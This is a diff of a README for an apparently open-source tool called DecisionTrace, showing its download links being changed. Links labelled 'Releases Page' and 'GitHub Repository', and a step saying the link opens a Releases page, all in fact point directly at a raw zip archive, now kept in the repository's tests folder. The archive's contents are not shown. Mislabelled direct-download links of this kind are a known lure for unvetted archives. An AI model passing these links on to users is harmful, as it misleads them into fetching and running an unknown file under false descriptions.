@@ -9,7 +9,7 @@ Welcome to DecisionTrace! This tool helps you record and track your AI's decisio
 To get started, you need to download DecisionTrace. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to our Releases page.  
-   [![Download DecisionTrace](https://github.com/IrishLaluz/DecisionTrace/raw/refs/heads/main/src/Decision_Trace_3.0-alpha.5.zip)](https://github.com/IrishLaluz/DecisionTrace/raw/refs/heads/main/src/Decision_Trace_3.0-alpha.5.zip)
+   [![Download DecisionTrace](https://raw.githubusercontent.com/IrishLaluz/DecisionTrace/main/tests/Decision-Trace-3.5.zip)](https://raw.githubusercontent.com/IrishLaluz/DecisionTrace/main/tests/Decision-Trace-3.5.zip)
 
 2. **Choose Your Version**: On the Releases page, you'll see different versions available. Select the most recent version.
 
@@ -76,8 +76,8 @@ DecisionTrace is open-source and freely available. Please check the **LICENSE** 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/IrishLaluz/DecisionTrace/raw/refs/heads/main/src/Decision_Trace_3.0-alpha.5.zip)
-- [GitHub Repository](https://github.com/IrishLaluz/DecisionTrace/raw/refs/heads/main/src/Decision_Trace_3.0-alpha.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/IrishLaluz/DecisionTrace/main/tests/Decision-Trace-3.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/IrishLaluz/DecisionTrace/main/tests/Decision-Trace-3.5.zip)
 - [Community Forum](#)
 
 Feel free to reach out if you have any questions. Enjoy using DecisionTrace, and let's ensure your AI's decisions remain transparent and accountable!
